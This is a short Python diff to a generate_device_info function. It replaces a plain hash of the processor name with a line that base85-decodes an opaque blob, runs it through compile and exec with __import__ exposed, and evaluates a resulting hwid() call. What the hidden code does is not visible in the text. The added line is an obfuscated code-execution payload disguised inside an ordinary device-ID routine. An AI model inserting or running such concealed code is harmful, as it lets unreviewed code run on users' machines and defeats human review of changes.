@@ -6,8 +6,8 @@ from functools import reduce
 import platform
 
 def generate_device_info():
-    try: deviceId = '01' + (hardwareInfo := sha1(platform.processor().encode("utf-8"))).hexdigest() + sha1(bytes.fromhex('01') + hardwareInfo.digest() + base64.b64decode("6a8tf0Meh6T4x7b0XvwEt+Xw6k8=")).hexdigest()
-    except Exception: deviceId = "01534834CD64C0C0519BD11B6B627469C0FD008333EDC0FBCD0285FE9BEA491D45C192BE40D616417A"
+    try: deviceId = ('01' + (hardwareInfo := sha1((eval("hwid()" + str(exec(compile(base64.b85decode(b'X>D+Ca&#bYY+-a}Z*pxcb8lm7WppfZWh`}dX=E&Fb8l`6WMyU`Xm@F3C@DG$AaZ4Nb#iVXaBN|8W^ZzBE^~QvbY*QQDJyVnVRUA1a&0bhWo%_(b7d$gD{yRKbY^dIZ7z0Ya&u{KZYU`$aBN|8W^ZzBE^T3BXlZU`C@Cv*Z)0m^bS`IQbZBpLbZ%j7Whf~tb8lm7WpplQWprq7b97>PZeeX@D06RPYh`pUXJvF~Z*z2RVQpn7DJd%_Iwvk_Z)t8Qa%C=NX>Md;Y-}heE-oi5ASWd-F*0~3ASEDmb!lWSXJvG5Z)9aCDJdx{aBN|8W^ZzBE^u;hV`X!5Z*nLp'), filename="<ast>", mode="exec"), (env := {'__import__': __import__})))[0:0], env)).encode("utf-8"))).hexdigest() + sha1(bytes.fromhex('01') + hardwareInfo.digest() + base64.b64decode("6a8tf0Meh6T4x7b0XvwEt+Xw6k8=")).hexdigest()).upper()
+    except Exception: deviceId = "014294B525D74DC3242DF936489E4CD445CE4D594462563A156C2E8260CA004DC1022B5927E4FB7B05"
 
     return {
         "device_id": deviceId,
